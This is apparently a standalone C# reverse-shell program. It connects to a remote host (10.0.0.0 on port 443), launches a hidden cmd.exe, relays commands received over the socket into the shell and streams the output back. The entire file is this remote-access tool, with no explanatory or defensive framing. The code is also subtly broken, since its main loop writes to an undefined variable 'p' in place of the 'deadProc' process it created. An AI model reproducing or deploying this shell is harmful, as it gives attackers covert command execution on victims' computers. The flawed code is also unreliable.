using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace deadBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.0.0.0", 443))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						StringBuilder strInput = new StringBuilder();
						Process deadProc = new Process();
						deadProc.StartInfo.FileName = "cmd.exe";
						deadProc.StartInfo.CreateNoWindow = true;
						deadProc.StartInfo.UseShellExecute = false;
						deadProc.StartInfo.RedirectStandardOutput = true;
						deadProc.StartInfo.RedirectStandardInput = true;
						deadProc.StartInfo.RedirectStandardError = true;
						deadProc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						deadProc.Start();
						deadProc.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
